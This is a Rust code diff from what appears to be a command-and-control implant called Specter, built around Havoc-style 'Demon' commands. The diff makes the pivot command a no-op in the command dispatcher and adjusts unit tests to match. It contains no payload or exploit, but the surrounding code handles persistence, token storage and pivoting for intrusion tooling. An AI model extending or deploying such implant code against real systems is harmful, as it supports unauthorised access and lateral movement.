@@ -224,6 +224,10 @@ pub fn dispatch(
         }
         DemonCommand::CommandPersist => handle_persist(&package.payload),
         DemonCommand::CommandExit => DispatchResult::Exit,
+        // CommandPivot is intercepted by the agent run-loop (agent.rs) *before*
+        // dispatch() is called, so it is routed to PivotState::handle_command()
+        // directly.  If it somehow reaches dispatch(), treat it as a no-op.
+        DemonCommand::CommandPivot => DispatchResult::Ignore,
         // These are agent-to-server callbacks; ignore if received from server.
         DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
         _ => {
@@ -9410,13 +9414,38 @@ mod tests {
         );
     }
 
+    // ── CommandPivot is handled outside dispatch() ─────────────────────────────
+
+    #[test]
+    fn dispatch_command_pivot_returns_ignore() {
+        // CommandPivot is intercepted by the agent run-loop (agent.rs) before
+        // dispatch() is called and routed to PivotState::handle_command().
+        // If it somehow reaches dispatch(), it should be safely ignored.
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandPivot, 42, vec![]);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
+        );
+        assert!(
+            matches!(result, DispatchResult::Ignore),
+            "CommandPivot must be Ignore in dispatch — it is handled in agent.rs"
+        );
+    }
+
     // ── unimplemented command error response ─────────────────────────────────
 
     #[test]
     fn dispatch_unhandled_command_returns_beacon_output_error_message() {
-        // CommandPivot is not yet implemented in Specter — it falls into the `_` arm.
+        // DemonInfo is a server-side-only identifier — it falls into the `_` arm.
         let mut config = SpecterConfig::default();
-        let package = DemonPackage::new(DemonCommand::CommandPivot, 42, vec![]);
+        let package = DemonPackage::new(DemonCommand::DemonInfo, 42, vec![]);
         let result = dispatch(
             &package,
             &mut config,
@@ -9452,7 +9481,7 @@ mod tests {
             "error text must mention 'specter does not implement', got: {text:?}"
         );
         assert!(
-            text.contains("CommandPivot"),
+            text.contains("DemonInfo"),
             "error text must include the command name, got: {text:?}"
         );
     }
